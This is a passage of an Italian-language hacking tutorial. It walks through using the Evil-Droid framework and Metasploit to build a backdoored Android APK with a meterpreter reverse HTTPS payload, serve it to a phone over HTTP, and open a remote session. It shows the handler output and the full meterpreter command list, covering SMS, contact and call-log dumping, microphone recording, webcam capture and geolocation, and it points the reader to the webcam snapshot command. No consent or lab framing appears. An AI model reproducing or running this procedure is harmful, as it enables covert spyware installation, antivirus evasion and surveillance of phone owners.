dal terminale lancia i comandi 
```bash
git clone https://github.com/M4sc3r4n0/Evil-Droid
cd Evil-Droid
chmod +x evil-droid
sudo ./evil-droid
```
Dopo aver installato autonomamente le estenzioni ti aprirà la schermata
```bash
              .           .                                                                    
              M.          .M                                                                   
               MMMMMMMMMMM.                                                                    
            .MMM\MMMMMMM/MMM.                                                                  
           .MMM.7MMMMMMM.7MMM.                                                                 
          .MMMMMMMMMMMMMMMMMMM                                                                 
          MMMMMMM.......MMMMMMM                                                                
          MMMMMMMMMMMMMMMMMMMMM                                                                
     MMMM MMMMMMMMMMMMMMMMMMMMM MMMM                                                           
    dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD                                                          
    dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD                                                          
    dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD                                                          
    dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD                                                          
    dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD                                                          
    dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD                                                          
    dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD                                                          
     MMM8 MMMMMMMMMMMMMMMMMMMMM 8MMM                                                           
          MMMMMMMMMMMMMMMMMMMMM                                                                
          MMMMMMMMMMMMMMMMMMMMM                                                                
              MMMMM   MMMMM  v0.3                                                              
              MMMMM   MMMMM                                                                    
              MMMMM   MMMMM                                                                    
              MMMMM   MMMMM                                                                    
              .MMM.   .MMM.                                                                    
      Mascerano Bachir - Dev-labs                                                              
                                                                                               
╔──────────────────────────────────────────────╗                                               
|          Evil-Droid Framework v0.3           |                                               
|      Hack & Remote android plateform         |                                               
┖──────────────────────────────────────────────┙                                               
[1] APK MSF                                                                                    
[2] BACKDOOR APK ORIGINAL (OLD)                                                                
[3] BACKDOOR APK ORIGINAL (NEW)                                                                
[4] BYPASS AV APK (ICON CHANGE)                                                                
[5] START LISTENER                                                                             
[c] CLEAN                                                                                      
[q] QUIT                                                                                       
[?] Select>: 1                                                                                 
                                                                                               
 [✔] APK MSF                                                                                   
                                                                                                                                                                                              
[ +++++++++++++++++++++++++++++++++++++++++++++++++++++++++    ]                               
[*] Generating apk payload                                                                     
[ ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++   ]                               
```
---

Successivamente  ti chiederà l'ip, la porta, il nome dell'app(puoi laciare tutto di default)
alla modalità selezione l'ultimo (android/meterpreter_reverse_https)
dopo aver generato il file ti verrà chiesto Multi-Handler 
Si aprirà automaticamente un Terminale che darà queste scritte

=[ metasploit v6.4.84-dev                          ]
+ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,680 payloads ]
+ -- --=[ 431 post - 49 encoders - 13 nops - 9 evasion     ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

[*] Using configured payload generic/shell_reverse_tcp
LHOST => 192.168.1.172
LPORT => 4444
PAYLOAD => android/meterpreter_reverse_https
[*] Started HTTPS reverse handler on https://192.168.1.172:4444
```
da un altro terminale vai nella cartella evilapk e lancia il comando 
```bash
sudo python3 -m http.server 80
```
dal cellulare ricerca http://<IP MACCHINA KALI>/
Da kali uscirànno circa questo output che si concluderà con meterpreter
```bash
[!] https://192.168.1.172:4444 handling request from 192.168.1.44; (UUID: mv67u5c4) Without a database connected that payload UUID tracking will not work!
[!] https://192.168.1.172:4444 handling request from 192.168.1.44; (UUID: mv67u5c4) Redirecting stageless connection from /Obh ViVFWLHl0vbNmHfWrfAs1Q4Pz29H4qiVEn9Vqh wm-nUe9aV5 with UA 'Mozilla/5.0 (iPad; CPU OS 17_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1'
[!] https://192.168.1.172:4444 handling request from 192.168.1.44; (UUID: mv67u5c4) Without a database connected that payload UUID tracking will not work!
[!] https://192.168.1.172:4444 handling request from 192.168.1.44; (UUID: mv67u5c4) Redirecting stageless connection from /Obh ViVFWLHl0vbNmHfA76KhGL30s2qAg9zMPwRGY 95APG47H0uqx3BzRoFGvAZadn9low with UA 'Mozilla/5.0 (iPad; CPU OS 17_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1'
[!] https://192.168.1.172:4444 handling request from 192.168.1.44; (UUID: mv67u5c4) Without a database connected that payload UUID tracking will not work!
[*] https://192.168.1.172:4444 handling request from 192.168.1.44; (UUID: mv67u5c4) Attaching orphaned/stageless session...
[*] https://192.168.1.172:4444 handling request from 192.168.1.44; (UUID: mv67u5c4) Connected to Meterpreter session 1 opened (192.168.1.172:4444 -> 192.168.1.44:53240) at 2025-11-05 10:52:20 -0500

meterpreter >
```
lancia il comando help per vedere tutte le operazioni possibili
```bash
meterpreter > help

Core Commands
=============
 
 Command               Description
 -------               -----------
 ?                     Help menu
 background            Backgrounds the current session
 bg                    Alias for background
 bgkill                Kills a background meterpreter script
 bglist                Lists running background scripts
 bgrun                 Executes a meterpreter script as a background thread
 channel               Displays information or control active channels
 close                 Closes a channel
 detach                Detach the meterpreter session (for http/https)
 disable_unicode_encoding  Disables encoding of unicode strings
 enable_unicode_encoding   Enables encoding of unicode strings
 exit                  Terminate the meterpreter session
 get_timeouts          Get the current session timeout values
 guid                  Get the session GUID
 help                  Help menu
 info                  Displays information about a Post module
 irb                   Open an interactive Ruby shell on the current session
 load                  Load one or more meterpreter extensions
 machine_id            Get the MSF ID of the machine attached to the session
 pry                   Open the Pry debugger on the current session
 quit                  Terminate the meterpreter session
 read                  Reads data from a channel
 resource              Run the commands stored in a file
 run                   Executes a meterpreter script or Post module
 secure                (Re)Negotiate TLV packet encryption on the session
 sessions              Quickly switch to another session
 set_timeouts          Set the current session timeout values
 sleep                 Force Meterpreter to go quiet, then re-establish session
 transport             Manage the transport mechanisms
 use                   Deprecated alias for "load"
 uuid                  Get the UUID for the current session
 write                 Writes data to a channel


Stdapi: File system Commands
===========================
 
 Command     Description
 -------     -----------
 cat         Read the contents of a file to the screen
 cd          Change directory
 checksum    Retrieve the checksum of a file
 cp          Copy source to destination
 del         Delete the specified file
 dir         List files (alias for ls)
 download    Download a file or directory
 edit        Edit a file
 getlwd      Print local working directory (alias for lpwd)
 getwd       Print working directory
 lcat        Read the contents of a local file to the screen
 lcd         Change local working directory
 ldir        List local files (alias for lls)
 lls         List local files
 lmkdir      Create new directory on local machine
 lpwd        Print local working directory
 ls          List files
 mkdir       Make directory
 mv          Move source to destination
 pwd         Print working directory
 rm          Delete the specified file
 rmdir       Remove directory
 search      Search for files
 upload      Upload a file or directory


Stdapi: Networking Commands
==========================
 
 Command    Description
 -------    -----------
 ifconfig   Display interfaces
 ipconfig   Display interfaces
 portfwd    Forward a local port to a remote service
 route      View and modify the routing table


Stdapi: System Commands
=======================
 
 Command    Description
 -------    -----------
 execute    Execute a command
 getenv     Get one or more environment variable values
 getpid     Get the current process identifier
 getuid     Get the user that the server is running as
 localtime  Displays the target system local date and time
 pgrep      Filter processes by name
 ps         List running processes
 shell      Drop into a system command shell
 sysinfo    Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================
 
 Command      Description
 -------      -----------
 screenshare  Watch the remote user desktop in real time
 screenshot   Grab a screenshot of the interactive desktop


Stdapi: Webcam Commands
=======================
 
 Command        Description
 -------        -----------
 record_mic     Record audio from the default microphone for X seconds
 webcam_chat    Start a video chat
 webcam_list    List webcams
 webcam_snap    Take a snapshot from the specified webcam
 webcam_stream  Play a video stream from the specified webcam


Stdapi: Audio Output Commands
============================
 
 Command   Description
 -------   -----------
 play      play a waveform audio file (.wav) on the target system


Android Commands
================
 
 Command           Description
 -------           -----------
 activity_start    Start an Android activity from a Uri string
 check_root        Check if device is rooted
 dump_calllog      Get call log
 dump_contacts     Get contacts list
 dump_sms          Get sms messages
 geolocate         Get current lat-long using geolocation
 hide_app_icon     Hide the app icon from the launcher
 interval_collect  Manage interval collection capabilities
 send_sms          Sends SMS from target session
 set_audio_mode    Set Ringer Mode
 sqlite_query      Query a SQLite database from storage
 wakelock          Enable/Disable Wakelock
 wlan_geolocate    Get current lat-long using WLAN information


For more info on a specific command, use <command> -h or help <command>.

```

ad esempio per accedere alla fotocamera cerca webcam_snap

